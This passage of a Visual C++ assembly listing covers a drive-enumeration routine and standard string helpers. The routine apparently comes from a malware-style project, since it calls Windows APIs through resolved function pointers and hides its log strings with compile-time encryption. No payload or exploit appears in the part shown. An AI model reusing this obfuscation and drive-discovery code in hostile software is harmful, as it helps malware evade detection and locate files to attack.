  00088	48 89 85 88 00
	00 00		 mov	 QWORD PTR Buffer$[rbp], rax

; 20   : 	if (!Buffer) {

  0008f	48 83 bd 88 00
	00 00 00	 cmp	 QWORD PTR Buffer$[rbp], 0
  00097	75 07		 jne	 SHORT $LN14@EnumirateD

; 21   : 		return 0;

  00099	33 c0		 xor	 eax, eax
  0009b	e9 e2 01 00 00	 jmp	 $LN1@EnumirateD
$LN14@EnumirateD:

; 22   : 	}
; 23   : 
; 24   : 	pGetLogicalDriveStringsW(BufferLength, Buffer);

  000a0	48 8b 95 88 00
	00 00		 mov	 rdx, QWORD PTR Buffer$[rbp]
  000a7	8b 4d 68	 mov	 ecx, DWORD PTR BufferLength$[rbp]
  000aa	e8 00 00 00 00	 call	 ?pGetLogicalDriveStringsW@@YAKKPEA_W@Z ; pGetLogicalDriveStringsW

; 25   : 	
; 26   : 	LPWSTR tempBuffer = Buffer;

  000af	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR Buffer$[rbp]
  000b6	48 89 85 a8 00
	00 00		 mov	 QWORD PTR tempBuffer$[rbp], rax
$LN5@EnumirateD:

; 27   : 
; 28   : 	while (Length = (INT)plstrlenW(tempBuffer)) {

  000bd	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR tempBuffer$[rbp]
  000c4	e8 00 00 00 00	 call	 ?plstrlenW@@YAHPEB_W@Z	; plstrlenW
  000c9	89 45 04	 mov	 DWORD PTR Length$[rbp], eax
  000cc	83 7d 04 00	 cmp	 DWORD PTR Length$[rbp], 0
  000d0	0f 84 f8 00 00
	00		 je	 $LN6@EnumirateD

; 29   : 
; 30   : 		PDRIVE_INFO DriveInfo = new DRIVE_INFO;

  000d6	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  000db	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000e0	48 89 85 c8 01
	00 00		 mov	 QWORD PTR $T2[rbp], rax
  000e7	48 83 bd c8 01
	00 00 00	 cmp	 QWORD PTR $T2[rbp], 0
  000ef	74 15		 je	 SHORT $LN17@EnumirateD
  000f1	48 8b 8d c8 01
	00 00		 mov	 rcx, QWORD PTR $T2[rbp]
  000f8	e8 00 00 00 00	 call	 ??0drive_info_@filesystem@@QEAA@XZ
  000fd	48 89 85 38 02
	00 00		 mov	 QWORD PTR tv91[rbp], rax
  00104	eb 0b		 jmp	 SHORT $LN18@EnumirateD
$LN17@EnumirateD:
  00106	48 c7 85 38 02
	00 00 00 00 00
	00		 mov	 QWORD PTR tv91[rbp], 0
$LN18@EnumirateD:
  00111	48 8b 85 38 02
	00 00		 mov	 rax, QWORD PTR tv91[rbp]
  00118	48 89 85 c8 00
	00 00		 mov	 QWORD PTR DriveInfo$1[rbp], rax

; 31   : 		if (!DriveInfo) {

  0011f	48 83 bd c8 00
	00 00 00	 cmp	 QWORD PTR DriveInfo$1[rbp], 0
  00127	75 13		 jne	 SHORT $LN15@EnumirateD

; 32   : 
; 33   : 			free(Buffer);

  00129	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR Buffer$[rbp]
  00130	e8 00 00 00 00	 call	 free

; 34   : 			return 0;

  00135	33 c0		 xor	 eax, eax
  00137	e9 46 01 00 00	 jmp	 $LN1@EnumirateD
$LN15@EnumirateD:

; 35   : 
; 36   : 		}
; 37   : 
; 38   : 		DriveInfo->RootPath = tempBuffer;

  0013c	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$1[rbp]
  00143	48 8b 95 a8 00
	00 00		 mov	 rdx, QWORD PTR tempBuffer$[rbp]
  0014a	48 8b c8	 mov	 rcx, rax
  0014d	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
$LN9@EnumirateD:

; 39   : 		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

  00152	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$1[rbp]
  00159	48 c7 40 20 00
	00 00 00	 mov	 QWORD PTR [rax+32], 0
  00161	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$1[rbp]
  00168	48 8b 8d 60 02
	00 00		 mov	 rcx, QWORD PTR DriveList$[rbp]
  0016f	48 8b 49 08	 mov	 rcx, QWORD PTR [rcx+8]
  00173	48 89 48 28	 mov	 QWORD PTR [rax+40], rcx
  00177	48 8b 85 60 02
	00 00		 mov	 rax, QWORD PTR DriveList$[rbp]
  0017e	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00182	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR DriveInfo$1[rbp]
  00189	48 89 08	 mov	 QWORD PTR [rax], rcx
  0018c	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$1[rbp]
  00193	48 83 c0 20	 add	 rax, 32			; 00000020H
  00197	48 8b 8d 60 02
	00 00		 mov	 rcx, QWORD PTR DriveList$[rbp]
  0019e	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax
  001a2	33 c0		 xor	 eax, eax
  001a4	85 c0		 test	 eax, eax
  001a6	75 aa		 jne	 SHORT $LN9@EnumirateD

; 40   : 
; 41   : 		DrivesCount++;

  001a8	8b 45 24	 mov	 eax, DWORD PTR DrivesCount$[rbp]
  001ab	ff c0		 inc	 eax
  001ad	89 45 24	 mov	 DWORD PTR DrivesCount$[rbp], eax

; 42   : 		tempBuffer += Length + 1;

  001b0	8b 45 04	 mov	 eax, DWORD PTR Length$[rbp]
  001b3	ff c0		 inc	 eax
  001b5	48 98		 cdqe
  001b7	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR tempBuffer$[rbp]
  001be	48 8d 04 41	 lea	 rax, QWORD PTR [rcx+rax*2]
  001c2	48 89 85 a8 00
	00 00		 mov	 QWORD PTR tempBuffer$[rbp], rax

; 43   : 
; 44   : 	}

  001c9	e9 ef fe ff ff	 jmp	 $LN5@EnumirateD
$LN6@EnumirateD:

; 45   : 
; 46   : 	logs::Write(OBFW(L"Found %d drives: "), DrivesCount);

  001ce	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@
  001d5	48 8d 8d e8 01
	00 00		 lea	 rcx, QWORD PTR $T3[rbp]
  001dc	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
  001e1	48 8b c8	 mov	 rcx, rax
  001e4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
  001e9	8b 55 24	 mov	 edx, DWORD PTR DrivesCount$[rbp]
  001ec	48 8b c8	 mov	 rcx, rax
  001ef	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 47   : 
; 48   : 	PDRIVE_INFO DriveInfo = NULL;

  001f4	48 c7 85 e8 00
	00 00 00 00 00
	00		 mov	 QWORD PTR DriveInfo$[rbp], 0

; 49   : 	TAILQ_FOREACH(DriveInfo, DriveList, Entries) {

  001ff	48 8b 85 60 02
	00 00		 mov	 rax, QWORD PTR DriveList$[rbp]
  00206	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00209	48 89 85 e8 00
	00 00		 mov	 QWORD PTR DriveInfo$[rbp], rax
  00210	eb 12		 jmp	 SHORT $LN12@EnumirateD
$LN10@EnumirateD:
  00212	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$[rbp]
  00219	48 8b 40 20	 mov	 rax, QWORD PTR [rax+32]
  0021d	48 89 85 e8 00
	00 00		 mov	 QWORD PTR DriveInfo$[rbp], rax
$LN12@EnumirateD:
  00224	48 83 bd e8 00
	00 00 00	 cmp	 QWORD PTR DriveInfo$[rbp], 0
  0022c	74 45		 je	 SHORT $LN11@EnumirateD

; 50   : 		logs::Write(OBFW(L"%s"), DriveInfo->RootPath.c_str());

  0022e	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR DriveInfo$[rbp]
  00235	48 8b c8	 mov	 rcx, rax
  00238	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  0023d	48 89 85 38 02
	00 00		 mov	 QWORD PTR tv158[rbp], rax
  00244	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15GANGMFKL@?$AA?$CF?$AAs@
  0024b	48 8d 8d 24 02
	00 00		 lea	 rcx, QWORD PTR $T4[rbp]
  00252	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  00257	48 8b c8	 mov	 rcx, rax
  0025a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0025f	48 8b 8d 38 02
	00 00		 mov	 rcx, QWORD PTR tv158[rbp]
  00266	48 8b d1	 mov	 rdx, rcx
  00269	48 8b c8	 mov	 rcx, rax
  0026c	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 51   : 	}

  00271	eb 9f		 jmp	 SHORT $LN10@EnumirateD
$LN11@EnumirateD:

; 52   : 
; 53   : 	free(Buffer);

  00273	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR Buffer$[rbp]
  0027a	e8 00 00 00 00	 call	 free

; 54   : 	return DrivesCount;

  0027f	8b 45 24	 mov	 eax, DWORD PTR DrivesCount$[rbp]
$LN1@EnumirateD:

; 55   : }

  00282	48 8d a5 48 02
	00 00		 lea	 rsp, QWORD PTR [rbp+584]
  00289	5f		 pop	 rdi
  0028a	5d		 pop	 rbp
  0028b	c3		 ret	 0
?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ENDP ; filesystem::EnumirateDrives
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0drive_info_@filesystem@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0drive_info_@filesystem@@QEAA@XZ PROC			; filesystem::drive_info_::drive_info_, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00022	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
??0drive_info_@filesystem@@QEAA@XZ ENDP			; filesystem::drive_info_::drive_info_
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1535 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1536 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1531 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1532 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4894 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4890 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 224
_Requested$ = 232
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00024	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00030	4c 8b c0	 mov	 r8, rax
  00033	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003a	48 8b 50 18	 mov	 rdx, QWORD PTR [rax+24]
  0003e	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Requested$[rbp]
  00045	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth

; 4775 :     }

  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 8
$T4 = 232
__$ArrayPad$ = 248
_Requested$ = 288
_Old$ = 296
_Max$ = 304
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 12 00 00 00	 mov	 ecx, 18
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 48
	01 00 00	 mov	 rcx, QWORD PTR [rsp+328]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 f8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00053	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Requested$[rbp]
  0005a	48 83 c8 07	 or	 rax, 7
  0005e	48 89 45 08	 mov	 QWORD PTR _Masked$[rbp], rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00062	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00069	48 39 45 08	 cmp	 QWORD PTR _Masked$[rbp], rax
  0006d	76 09		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  0006f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00076	eb 68		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00078	33 d2		 xor	 edx, edx
  0007a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  00081	b9 02 00 00 00	 mov	 ecx, 2
  00086	48 f7 f1	 div	 rcx
  00089	48 8b 8d 30 01
	00 00		 mov	 rcx, QWORD PTR _Max$[rbp]
  00090	48 2b c8	 sub	 rcx, rax
  00093	48 8b c1	 mov	 rax, rcx
  00096	48 39 85 28 01
	00 00		 cmp	 QWORD PTR _Old$[rbp], rax
  0009d	76 09		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0009f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  000a6	eb 38		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  000a8	33 d2		 xor	 edx, edx
  000aa	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  000b1	b9 02 00 00 00	 mov	 ecx, 2
  000b6	48 f7 f1	 div	 rcx
  000b9	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Old$[rbp]
  000c0	48 03 c8	 add	 rcx, rax
  000c3	48 8b c1	 mov	 rax, rcx
  000c6	48 89 85 e8 00
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cd	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  000d4	48 8d 4d 08	 lea	 rcx, QWORD PTR _Masked$[rbp]
  000d8	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  000dd	48 8b 00	 mov	 rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4771 :     }

  000e0	48 8b f8	 mov	 rdi, rax
  000e3	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000e7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData
  000ee	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000f3	48 8b c7	 mov	 rax, rdi
  000f6	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000fd	48 33 cd	 xor	 rcx, rbp
  00100	e8 00 00 00 00	 call	 __security_check_cookie
  00105	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0010c	5f		 pop	 rdi
  0010d	5d		 pop	 rbp
  0010e	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
